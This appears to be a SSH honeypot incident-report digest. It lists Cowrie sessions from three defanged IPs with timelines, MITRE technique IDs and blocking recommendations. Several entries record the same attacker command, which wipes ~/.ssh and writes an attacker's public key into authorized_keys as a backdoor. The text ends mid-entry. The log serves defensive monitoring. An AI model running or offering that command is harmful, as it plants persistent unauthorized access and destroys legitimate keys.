| **First Seen** | 2026-06-02 16:51 |
| **Last Seen** | 2026-06-02 16:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:51:39` | `cowrie.session.connect` |
| `2026-06-02 16:51:39` | `cowrie.client.version` |
| `2026-06-02 16:51:39` | `cowrie.client.kex` |
| `2026-06-02 16:51:40` | `cowrie.login.success` |
| `2026-06-02 16:51:41` | `cowrie.session.params` |
| `2026-06-02 16:51:41` | `cowrie.command.input` |
| `2026-06-02 16:51:41` | `cowrie.command.failed` |
| `2026-06-02 16:51:41` | `cowrie.log.closed` |
| `2026-06-02 16:51:42` | `cowrie.session.params` |
| `2026-06-02 16:51:42` | `cowrie.command.input` |
| `2026-06-02 16:51:42` | `cowrie.session.file_download` |
| `2026-06-02 16:51:42` | `cowrie.log.closed` |
| `2026-06-02 16:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296de9691630

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 16:51 |
| **Last Seen** | 2026-06-02 16:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:51:45` | `cowrie.session.connect` |
| `2026-06-02 16:51:45` | `cowrie.client.version` |
| `2026-06-02 16:51:45` | `cowrie.client.kex` |
| `2026-06-02 16:51:46` | `cowrie.login.success` |
| `2026-06-02 16:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4277a7af8283

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:52 |
| **Last Seen** | 2026-06-02 16:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:52:03` | `cowrie.session.connect` |
| `2026-06-02 16:52:03` | `cowrie.client.version` |
| `2026-06-02 16:52:03` | `cowrie.client.kex` |
| `2026-06-02 16:52:04` | `cowrie.login.success` |
| `2026-06-02 16:52:05` | `cowrie.session.params` |
| `2026-06-02 16:52:05` | `cowrie.command.input` |
| `2026-06-02 16:52:05` | `cowrie.command.failed` |
| `2026-06-02 16:52:05` | `cowrie.log.closed` |
| `2026-06-02 16:52:06` | `cowrie.session.params` |
| `2026-06-02 16:52:06` | `cowrie.command.input` |
| `2026-06-02 16:52:06` | `cowrie.session.file_download` |
| `2026-06-02 16:52:06` | `cowrie.log.closed` |
| `2026-06-02 16:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b193c441e109

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:52 |
| **Last Seen** | 2026-06-02 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:52:09` | `cowrie.session.connect` |
| `2026-06-02 16:52:09` | `cowrie.client.version` |
| `2026-06-02 16:52:09` | `cowrie.client.kex` |
| `2026-06-02 16:52:10` | `cowrie.login.success` |
| `2026-06-02 16:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-429f185efc3f

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:53 |
| **Last Seen** | 2026-06-02 16:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:53:50` | `cowrie.session.connect` |
| `2026-06-02 16:53:50` | `cowrie.client.version` |
| `2026-06-02 16:53:50` | `cowrie.client.kex` |
| `2026-06-02 16:53:51` | `cowrie.login.success` |
| `2026-06-02 16:53:52` | `cowrie.session.params` |
| `2026-06-02 16:53:52` | `cowrie.command.input` |
| `2026-06-02 16:53:52` | `cowrie.command.failed` |
| `2026-06-02 16:53:52` | `cowrie.log.closed` |
| `2026-06-02 16:53:52` | `cowrie.session.params` |
| `2026-06-02 16:53:52` | `cowrie.command.input` |
| `2026-06-02 16:53:53` | `cowrie.session.file_download` |
| `2026-06-02 16:53:53` | `cowrie.log.closed` |
| `2026-06-02 16:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314a5e697ac6

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:53 |
| **Last Seen** | 2026-06-02 16:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:53:56` | `cowrie.session.connect` |
| `2026-06-02 16:53:56` | `cowrie.client.version` |
| `2026-06-02 16:53:56` | `cowrie.client.kex` |
| `2026-06-02 16:53:57` | `cowrie.login.success` |
| `2026-06-02 16:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c6bbaf064be

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 16:55 |
| **Last Seen** | 2026-06-02 16:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:55:12` | `cowrie.session.connect` |
| `2026-06-02 16:55:12` | `cowrie.client.version` |
| `2026-06-02 16:55:12` | `cowrie.client.kex` |
| `2026-06-02 16:55:13` | `cowrie.login.success` |
| `2026-06-02 16:55:14` | `cowrie.session.params` |
| `2026-06-02 16:55:14` | `cowrie.command.input` |
| `2026-06-02 16:55:14` | `cowrie.command.failed` |
| `2026-06-02 16:55:14` | `cowrie.log.closed` |
| `2026-06-02 16:55:14` | `cowrie.session.params` |
| `2026-06-02 16:55:14` | `cowrie.command.input` |
| `2026-06-02 16:55:15` | `cowrie.session.file_download` |
| `2026-06-02 16:55:15` | `cowrie.log.closed` |
| `2026-06-02 16:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a3198e31200

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 16:55 |
| **Last Seen** | 2026-06-02 16:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:55:18` | `cowrie.session.connect` |
| `2026-06-02 16:55:18` | `cowrie.client.version` |
| `2026-06-02 16:55:18` | `cowrie.client.kex` |
| `2026-06-02 16:55:19` | `cowrie.login.success` |
| `2026-06-02 16:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78da05abd05d

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 16:57 |
| **Last Seen** | 2026-06-02 16:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:57:09` | `cowrie.session.connect` |
| `2026-06-02 16:57:09` | `cowrie.client.version` |
| `2026-06-02 16:57:10` | `cowrie.client.kex` |
| `2026-06-02 16:57:11` | `cowrie.login.success` |
| `2026-06-02 16:57:11` | `cowrie.session.params` |
| `2026-06-02 16:57:11` | `cowrie.command.input` |
| `2026-06-02 16:57:11` | `cowrie.command.failed` |
| `2026-06-02 16:57:12` | `cowrie.log.closed` |
| `2026-06-02 16:57:12` | `cowrie.session.params` |
| `2026-06-02 16:57:12` | `cowrie.command.input` |
| `2026-06-02 16:57:12` | `cowrie.session.file_download` |
| `2026-06-02 16:57:12` | `cowrie.log.closed` |
| `2026-06-02 16:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da521d7fad3

| Field | Detail |
|---|---|
| **Source IP** | `107.0.200[.]227` |
| **First Seen** | 2026-06-02 16:57 |
| **Last Seen** | 2026-06-02 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:57:16` | `cowrie.session.connect` |
| `2026-06-02 16:57:16` | `cowrie.client.version` |
| `2026-06-02 16:57:16` | `cowrie.client.kex` |
| `2026-06-02 16:57:17` | `cowrie.login.success` |
| `2026-06-02 16:57:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.0.200[.]227` to AbuseIPDB if not already reported
- [ ] Block `107.0.200[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b2093495ff2

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:57 |
| **Last Seen** | 2026-06-02 16:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:57:50` | `cowrie.session.connect` |
| `2026-06-02 16:57:50` | `cowrie.client.version` |
| `2026-06-02 16:57:50` | `cowrie.client.kex` |
| `2026-06-02 16:57:51` | `cowrie.login.success` |
| `2026-06-02 16:57:51` | `cowrie.session.params` |
| `2026-06-02 16:57:51` | `cowrie.command.input` |
| `2026-06-02 16:57:51` | `cowrie.command.failed` |
| `2026-06-02 16:57:52` | `cowrie.log.closed` |
| `2026-06-02 16:57:52` | `cowrie.session.params` |
| `2026-06-02 16:57:52` | `cowrie.command.input` |
| `2026-06-02 16:57:53` | `cowrie.session.file_download` |
| `2026-06-02 16:57:53` | `cowrie.log.closed` |
| `2026-06-02 16:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b02d82e45d7

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:57 |
| **Last Seen** | 2026-06-02 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:57:56` | `cowrie.session.connect` |
| `2026-06-02 16:57:56` | `cowrie.client.version` |
| `2026-06-02 16:57:56` | `cowrie.client.kex` |
| `2026-06-02 16:57:57` | `cowrie.login.success` |
| `2026-06-02 16:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bdb13a450d4

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 16:59 |
| **Last Seen** | 2026-06-02 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:59:33` | `cowrie.session.connect` |
| `2026-06-02 16:59:33` | `cowrie.client.version` |
| `2026-06-02 16:59:33` | `cowrie.client.kex` |
| `2026-06-02 16:59:33` | `cowrie.login.success` |
| `2026-06-02 16:59:33` | `cowrie.session.params` |
| `2026-06-02 16:59:33` | `cowrie.command.input` |
| `2026-06-02 16:59:33` | `cowrie.command.failed` |
| `2026-06-02 16:59:33` | `cowrie.log.closed` |
| `2026-06-02 16:59:33` | `cowrie.session.params` |
| `2026-06-02 16:59:33` | `cowrie.command.input` |
| `2026-06-02 16:59:33` | `cowrie.session.file_download` |
| `2026-06-02 16:59:33` | `cowrie.log.closed` |
| `2026-06-02 16:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f02e95e2dfb

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 16:59 |
| **Last Seen** | 2026-06-02 16:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:59:34` | `cowrie.session.connect` |
| `2026-06-02 16:59:34` | `cowrie.client.version` |
| `2026-06-02 16:59:34` | `cowrie.client.kex` |
| `2026-06-02 16:59:34` | `cowrie.login.success` |
| `2026-06-02 16:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.21.59[.]218` to AbuseIPDB if not already reported
- [ ] Block `125.21.59[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4904937e541

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:59 |
| **Last Seen** | 2026-06-02 16:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:59:49` | `cowrie.session.connect` |
| `2026-06-02 16:59:49` | `cowrie.client.version` |
| `2026-06-02 16:59:49` | `cowrie.client.kex` |
| `2026-06-02 16:59:50` | `cowrie.login.success` |
| `2026-06-02 16:59:51` | `cowrie.session.params` |
| `2026-06-02 16:59:51` | `cowrie.command.input` |
| `2026-06-02 16:59:51` | `cowrie.command.failed` |
| `2026-06-02 16:59:52` | `cowrie.log.closed` |
| `2026-06-02 16:59:52` | `cowrie.session.params` |
| `2026-06-02 16:59:52` | `cowrie.command.input` |
| `2026-06-02 16:59:52` | `cowrie.session.file_download` |
| `2026-06-02 16:59:52` | `cowrie.log.closed` |
| `2026-06-02 16:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab658f021d0c

| Field | Detail |
|---|---|
| **Source IP** | `190.151.130[.]5` |
| **First Seen** | 2026-06-02 16:59 |
| **Last Seen** | 2026-06-02 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 16:59:55` | `cowrie.session.connect` |
| `2026-06-02 16:59:55` | `cowrie.client.version` |
| `2026-06-02 16:59:55` | `cowrie.client.kex` |
| `2026-06-02 16:59:56` | `cowrie.login.success` |
| `2026-06-02 16:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.151.130[.]5` to AbuseIPDB if not already reported
- [ ] Block `190.151.130[.]5` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ddf453ad905

| Field | Detail |
|---|---|
| **Source IP** | `125.21.59[.]218` |
| **First Seen** | 2026-06-02 17:01 |
| **Last Seen** | 2026-06-02 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 17:01:42` | `cowrie.session.connect` |
| `2026-06-02 17:01:42` | `cowrie.client.version` |
| `2026-06-02 17:01:42` | `cowrie.client.kex` |
